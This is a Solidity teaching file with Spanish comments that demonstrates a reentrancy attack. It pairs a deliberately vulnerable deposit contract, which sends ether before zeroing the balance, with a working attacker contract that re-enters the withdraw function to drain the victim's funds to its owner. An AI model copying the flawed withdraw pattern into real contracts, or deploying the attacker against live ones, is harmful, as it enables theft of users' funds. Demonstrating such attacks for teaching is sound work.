// SPDX-License-Identifier: MIT
/*
@autor JAGD mayo 2024
Clase para demostrar el ataque de reentrada
Se utilizan las librerías de seguridad OpenZeppelin 
//https://github.com/OpenZeppelin/openzeppelin-contracts */
pragma solidity ^0.8.7;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
//ejemplos de ownable
//https://github.com/jamesbachini/Solidity-Snippets/blob/main/contracts/Ownable.sol
/******************************************************************************/
//Contrato "víctima"
contract EthDeposit {
	using Address for address payable;
	//mapping que almacena los balances de cada usuario
	mapping(address => uint256) public balance;
	//función para depositar ether en este contrato
	function depositEther() external payable {
		balance[msg.sender] += msg.value;
	}
	
	//función que tiene la vulnerabilidad y que permite extraer los ether
	function withdrawEther() external {
		//envío de ether
		payable(msg.sender).sendValue(balance[msg.sender]);
		//actualizar a 0 después del envío
		balance[msg.sender] = 0;
	}
}


////Contrato atacante
//Con Ownable indicamos que la función de ataque solo la puede ejecutar el que ha desplegado el contrato
contract Attacker  is Ownable(msg.sender) {
	
	//instancia del contrato EthDeposit víctima
	EthDeposit public immutable ethContract;
	
	//el constructor inicializa la dirección del contrato ya desplegado
	constructor(address _ethAddress) {
		ethContract = EthDeposit(_ethAddress);
	}
	
	//función que hace el ataque. 
	function attack() external payable  {
		//1 Hace el depósito.
		ethContract.depositEther{value: msg.value}();
		//2º lo retira
		ethContract.withdrawEther();
	}
	
	receive() external payable {
		if (address(ethContract).balance > 0){
			//Si ha fondos los retiramos
			ethContract.withdrawEther();
			//y los asignamos al owner del contrato
			payable(owner()).transfer(address(this).balance);			
		}
	}	
}
